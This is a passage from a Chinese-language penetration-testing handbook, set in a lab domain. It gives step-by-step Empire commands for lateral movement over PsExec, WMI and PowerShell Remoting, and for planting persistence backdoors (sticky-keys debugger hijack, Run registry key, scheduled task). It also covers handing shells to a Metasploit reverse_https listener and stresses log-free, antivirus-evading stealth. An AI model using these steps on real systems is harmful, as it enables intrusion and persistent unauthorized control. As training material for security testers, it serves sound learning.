## Page 347
### 使用PsExec进行横向渗透

**描述：**
使用PsExec类型的stager在远程主机上执行。

**选项：**
- **名称**：Listener
- **是否必需**：否
- **值**：使用的监听器。
- **图6-145**：查看设置参数
- **说明**：在此步骤中，需要设置计算机名和监听器。输入以下命令并执行`execute`后即可看到反弹已成功，如图6-146所示。
  - `set ComputerName WIN7-X86.shuteer.testlab`
  - `set Listener shuteer`
  - `execute`

**结果：**
- 执行上述命令后，可以看到反弹已经成功，如图6-146所示。
- 输入`agents`命令查看当前的agents，会发现多了一个IP为192.168.31.158、机器名为WIN7-X86的服务器，如图6-147所示。

---

## Page 348
### 使用WMI进行横向渗透

**描述：**
WMI比PsExec更安全，所有Windows系统都启用了该服务。当攻击者使用wmiexec进行攻击时，默认情况下，Windows系统不会在日志中记录这些操作，这意味着可以实现无日志攻击，并且攻击脚本无需写入磁盘，具有很高的隐蔽性。但如果目标机器开启了防火墙，则无法通过WMI连接到目标机器。使用`usemodule lateral_movement/invoke_wmi`模块，输入`info`命令查看具体参数，如图6-148所示。

**选项：**
- **名称**：Trusted
- **是否必需**：是
- **值**：默认
- **说明**：用户名用于执行操作。
- **其他选项**：
  - **Proxy**：代理
  - **UserAgent**：用户代理
  - **Stdio**：标准输入输出

**步骤：**
- 设置计算机名和监听器，输入以下命令并执行`execute`后即可看到反弹已成功，如图6-149所示。
  - `Set ComputerName WIN7-X86.shuteer.testlab`
  - `Set Listener shuteer`
  - `execute`

**结果：**
- 反弹成功，如图6-149所示。

**附加信息：**
- WMI还有一个`invoke_wmi_debugger`模块，它使用WMI设置五个Windows Accessibility可执行文件中的任意一个作为调试器，包括`sethc.exe`（粘滞键）、`narrator.exe`（文本转语音）、`Utilman.exe`（Windows辅助管理器）、`Osk.exe`（虚拟键盘）和`Magnify.exe`（放大镜）。

---

## Page 349
### 使用PowerShell Remoting进行横向渗透

**描述：**
PowerShell Remoting是PowerShell的远程管理功能，开启Windows远程管理服务（WinRM）后会监听5985端口。该服务在Windows Server 2012中默认启动，在Windows Server 2003/2008/2008R2中需要手动启动。

**步骤：**
- 如果目标主机启用了PowerShell Remoting或拥有启用它的权限的凭据，可以使用`invoke_psremoting`模块进行横向渗透，如图6-150所示。
- 输入以下命令并执行`execute`后即可看到反弹已成功。
  - `Set ComputerName WIN7-X86.shuteer.testlab`
  - `Set Listener shuteer`
  - `execute`

**结果：**
- 反弹成功，如图6-150所示。

---

## Page 350
### 后门技术

**描述：**
后门是指绕过安全控制面获取对程序或系统访问权的方法。后门的主要目的是方便以后再次秘密进入或控制系统。

#### 1. 权限持久性劫持Shift后门

**步骤：**
- 使用`invoke_wmi_debugger`模块，输入`info`命令查看具体的设置参数，如图6-151所示。
- 设置以下参数并执行`execute`：
  - `set Listener shuteer`
  - `set ComputerName WIN7-64.shuteer.testlab`
  - `set TargetBinary sethc.exe`
  - `execute`

**结果：**
- 在目标主机远程登录窗口按5次Shift键即可触发后门，目标主机上会有一个命令框一闪而过，如图6-153所示。
- Empire已经有反弹代理上线，如图6-154所示。

**替代项：**
- `sethc.exe`可以替换成以下几项：
  - `Utilman.exe`（使用Win+U组合键启动）
  - `osk.exe`（屏幕上的键盘：使用Win+U组合键启动）
  - `Narrator.exe`（启动讲述人：使用Win+U组合键启动）
  - `Magnify.exe`（放大镜：使用Win+U组合键启动）

#### 2. 注册表注入后门

**步骤：**
- 使用`registry`模块，运行后会在目标主机启动项里增加一个命令。
- 设置以下参数并执行`execute`：
  - `set Listener shuteer`
  - `set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run`
  - `execute`

**结果：**
- 登录系统时木马会运行，服务端反弹成功，如图6-156所示。

#### 3. 计划任务获得系统权限

**步骤：**
- 使用`schtasks`模块，设置`DailyTime`和`Listener`这两个参数。
- 输入以下命令并执行`execute`：
  - `set DailyTime 16:17`
  - `set Listener test`
  - `execute`

**结果：**
- 到了设置的具体时间时将成功返回一个高权限的Shell，在实际渗透中运行该模块时，杀毒软件会有提示，如图6-157所示。
- 输入`agents`命令查看当前agents，可以看到又多了一个具有SYSTEM权限的客户端，如图6-158所示，说明提权成功。

---

## Page 353
### 将Empire反弹回Metasploit

**描述：**
在实际渗透中，如果上传的MSF客户端无法绕过目标主机的杀毒软件，可以使用PowerShell来绕过，也可以执行Empire的Payload来绕过，成功之后再使用Empire的模块将其反弹回Metasploit。

**步骤：**
- 使用`invoke_shellCode`模块修改两个参数：`Lhost`和`Lport`。
- 设置以下参数并执行`execute`：
  - `Set Lhost 192.168.31.247`
  - `Set Lport 4444`
  - `execute`

**结果：**
- 在MSF上设置监听，命令如下：
  - `Use exploit/multi/handler`
  - `Set payload windows/meterpreter/reverse_https`
  - `Set Lhost 192.168.31.247`
  - `Set Lport 4444`
  - `Run`

- 运行后，就可以收到Empire反弹回来的Shell，如图6-160所示。

---

## Page 354
### Nishang简介

**描述：**
Nishang是一款针对PowerShell的渗透工具，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等脚本，被广泛应用于渗透测试的各个阶段。其下载地址为https://github.com/samratashok/nishang。

**要求：**
- Nishang需要在PowerShell 3.0以上的环境中才能正常使用。

**步骤：**
- 导入模块后，输入`Get-Command -Module nishang`命令查看Nishang都有哪些模块，如图6-161所示。
- 执行`Get-Information`命令获取目标机器上的大量信息（FTP访问、进程、计算机配置信息、无线网络和设备的信息、Hosts信息等），如图6-162所示。

**结果：**
- 可以把获取的信息保存在`res.txt`中，命令如下：
  - `PS D:\nishang-master> Get-Information | Out-File res.txt`

**附加信息：**
- 查看Nishang的目录结构，了解目录结构对寻找文件位置很有帮助，如图6-163所示。